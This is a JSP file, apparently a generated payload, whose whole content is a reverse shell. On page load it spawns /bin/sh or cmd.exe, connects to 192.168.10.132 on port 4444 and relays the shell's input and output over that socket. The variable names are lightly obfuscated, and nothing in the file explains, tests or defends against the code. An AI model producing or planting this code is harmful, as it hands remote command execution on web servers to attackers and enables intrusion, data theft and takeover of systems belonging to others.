<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream hr;
    OutputStream av;

    StreamConnector( InputStream hr, OutputStream av )
    {
      this.hr = hr;
      this.av = av;
    }

    public void run()
    {
      BufferedReader iy  = null;
      BufferedWriter kqk = null;
      try
      {
        iy  = new BufferedReader( new InputStreamReader( this.hr ) );
        kqk = new BufferedWriter( new OutputStreamWriter( this.av ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = iy.read( buffer, 0, buffer.length ) ) > 0 )
        {
          kqk.write( buffer, 0, length );
          kqk.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( iy != null )
          iy.close();
        if( kqk != null )
          kqk.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.10.132", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
